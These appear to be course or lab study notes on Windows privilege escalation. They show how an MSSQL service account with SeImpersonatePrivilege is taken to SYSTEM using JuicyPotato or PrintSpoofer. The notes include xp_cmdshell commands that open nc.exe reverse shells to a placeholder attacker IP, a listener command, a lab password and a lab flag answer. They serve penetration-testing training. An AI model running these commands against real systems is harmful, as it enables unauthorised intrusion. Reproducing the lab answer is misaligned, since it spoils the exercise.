# SeImpersonate and SeAssignPrimaryToken

## ID
700

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 7 — SeImpersonate and SeAssignPrimaryToken

## Description
Escalate from a service account (MSSQL) to NT AUTHORITY\SYSTEM by abusing SeImpersonatePrivilege via JuicyPotato, PrintSpoofer, or RoguePotato.

## Tags
seimpersonate, privilege-escalation, potato, printspoofer, mssql, windows

## Commands
- `mssqlclient.py <USER>@<TARGET_IP> -windows-auth`
- `enable_xp_cmdshell`
- `xp_cmdshell whoami /priv`
- `xp_cmdshell c:\tools\JuicyPotato.exe -l <PORT> -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <ATTACKER_IP> <LPORT> -e cmd.exe" -t *`
- `xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <ATTACKER_IP> <LPORT> -e cmd.exe"`
- `nc -lvnp <LPORT>`

## What This Section Covers
Service accounts (MSSQL, IIS, etc.) often hold SeImpersonatePrivilege, which lets them impersonate any client token — including SYSTEM. This section teaches how to detect the privilege and exploit it with Potato-family tools and PrintSpoofer to go from service account to full SYSTEM access.

## Methodology
1. Gain command execution on the target via `mssqlclient.py` with `-windows-auth`, then run `enable_xp_cmdshell`.
2. Run `xp_cmdshell whoami /priv` and confirm `SeImpersonatePrivilege` is **Enabled**.
3. Start a netcat listener on your attack box: `nc -lvnp 8443`.
4. Use **PrintSpoofer** (Windows 10 / Server 2019+) or **JuicyPotato** (Server 2016 and earlier) to spawn a SYSTEM reverse shell back to your listener.
5. Confirm SYSTEM access with `whoami` and collect the flag.

## Multi-step Workflow
```
# Terminal 1 — SQL shell
mssqlclient.py sql_dev@<TARGET_IP> -windows-auth
# password: Str0ng_P@ssw0rd!
enable_xp_cmdshell
xp_cmdshell whoami /priv

# Terminal 2 — listener
nc -lvnp 8443

# Terminal 1 — trigger PrintSpoofer
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <PWNBOX_IP> 8443 -e cmd.exe"

# Terminal 2 — SYSTEM shell arrives
whoami
type C:\Users\Administrator\Desktop\SeImpersonate\flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Flag at `c:\Users\Administrator\Desktop\SeImpersonate\flag.txt` | F3ar_th3_p0tato! | PrintSpoofer → SYSTEM shell → `type` flag |

## Key Takeaways
- Any time you land on a service account (MSSQL, IIS/ASP.NET, Jenkins), immediately run `whoami /priv` — SeImpersonate is extremely common and gives a fast path to SYSTEM.
- **JuicyPotato** works on Server 2016 and earlier; it does NOT work on Server 2019 / Win10 build 1809+.
- **PrintSpoofer** and **RoguePotato** fill the gap for Server 2019 / Win10 1809+ targets.
- JuicyPotato uses DCOM/NTLM reflection; PrintSpoofer abuses the Print Spooler named pipe — different mechanism, same end result.
- The `-t *` flag in JuicyPotato tries both `CreateProcessWithTokenW` (needs SeImpersonate) and `CreateProcessAsUser` (needs SeAssignPrimaryToken).

## Gotchas
- JuicyPotato silently fails on Server 2019+ with no clear error — if it doesn't work, switch to PrintSpoofer immediately.
- Make sure the COM server listening port (`-l`) in JuicyPotato isn't already in use or firewalled.
- The netcat binary path on the target matters — confirm it's at `c:\tools\nc.exe` (or wherever staged) before firing the exploit.
